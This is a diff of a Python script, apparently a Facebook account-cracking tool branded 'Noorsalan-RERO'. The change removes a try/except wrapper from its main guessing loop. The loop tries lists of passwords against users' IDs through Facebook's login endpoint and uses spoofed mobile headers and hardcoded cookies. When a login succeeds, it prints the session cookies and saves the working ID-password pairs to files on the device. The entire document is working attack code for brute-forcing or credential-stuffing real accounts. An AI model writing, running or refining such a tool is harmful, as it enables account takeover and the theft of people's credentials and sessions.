@@ -167,76 +167,72 @@ def rcrack1(uid,pwx,tl):
     global cps
     global oks
     global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            bi = random.choice([A,B,C,D,E,F,G,H])
-            cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
-            sys.stdout.write(f'\r \033[1;90m[\33[1;92mNoorsalan-RERO\033[1;90m]\x1b[1;96m-\033[1;90m[{cl}{loop}\033[1;90m]\x1b[1;96m-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
-            
-            cookies = {
-                'datr': 'H4aEakE2BpdsQ7MYmJw3h9dC',
-                'sb': 'H4aEauGKc330Ki2ejzrq5Uk6',
-                'm_pixel_ratio': '2',
-                'wd': '360x800',
-                'ps_l': '1',
-                'ps_n': '1',
-                'fr': '0WvNBderHaBIoF1bW..BqhIYf..AAA.0.0.BqhIY4.AWcAKsdat_UIt2PWmdQS6GiL2IU',
-            }
-            header_freefb = {
-                'authority': 'm.facebook.com',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'en-US,en;q=0.9',
-                'cache-control': 'max-age=0',
-                'dpr': '2',
-                'sec-ch-prefers-color-scheme': 'light',
-                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-model': '"TECNO KM5"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-platform-version': '"15.0.0"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': pro,
-                'viewport-width': '980',
-            }
-            
-            free_fb = session.get('https://free.facebook.com', cookies=cookies, headers=header_freefb).text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-                "try_number":"0",
-                "unrecognized_tries":"0",
-                "email":uid,
-                "pass":ps,
-                "login":"Log In"
-            }
-            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=111&refid=8', data=log_data, cookies=cookies, headers=header_freefb).text
-            log_cookies = session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print(f"\033[38;5;46m=[Noorsalan-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
-                open('/sdcard/Noorsalan-OK.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-                print(f"\x1b[38;5;196m=[Noorsalan-LK💔]= {uid}|{ps}")
-                open('/sdcard/Noorsalan-LK.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
-            else:
-                continue
-        loop+=1
+    for ps in pwx:
+        pro = random.choice(ugen)
+        session = requests.Session()
+        bi = random.choice([A,B,C,D,E,F,G,H])
+        cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
+        sys.stdout.write(f'\r \033[1;90m[\33[1;92mNoorsalan-RERO\033[1;90m]\x1b[1;96m-\033[1;90m[{cl}{loop}\033[1;90m]\x1b[1;96m-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
         
-    except:
-        pass
+        cookies = {
+            'datr': 'H4aEakE2BpdsQ7MYmJw3h9dC',
+            'sb': 'H4aEauGKc330Ki2ejzrq5Uk6',
+            'm_pixel_ratio': '2',
+            'wd': '360x800',
+            'ps_l': '1',
+            'ps_n': '1',
+            'fr': '0WvNBderHaBIoF1bW..BqhIYf..AAA.0.0.BqhIY4.AWcAKsdat_UIt2PWmdQS6GiL2IU',
+        }
+        header_freefb = {
+            'authority': 'm.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"TECNO KM5"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,
+            'viewport-width': '980',
+        }
+        
+        free_fb = session.get('https://free.facebook.com', cookies=cookies, headers=header_freefb).text
+        log_data = {
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"
+        }
+        lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=111&refid=8', data=log_data, cookies=cookies, headers=header_freefb).text
+        log_cookies = session.cookies.get_dict().keys()
+        if 'c_user' in log_cookies:
+            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+            cid = coki[65:80]
+            print(f"\033[38;5;46m=[Noorsalan-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
+            open('/sdcard/Noorsalan-OK.txt', 'a').write( uid+' | '+ps+'\n')
+            oks.append(cid)
+        elif 'checkpoint' in log_cookies:
+            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+            cid = coki[82:97]
+            print(f"\x1b[38;5;196m=[Noorsalan-LK💔]= {uid}|{ps}")
+            open('/sdcard/Noorsalan-LK.txt', 'a').write( uid+' | '+ps+' \n')
+            cps.append(uid)
+        else:
+            continue
+    loop+=1
 
 Main()
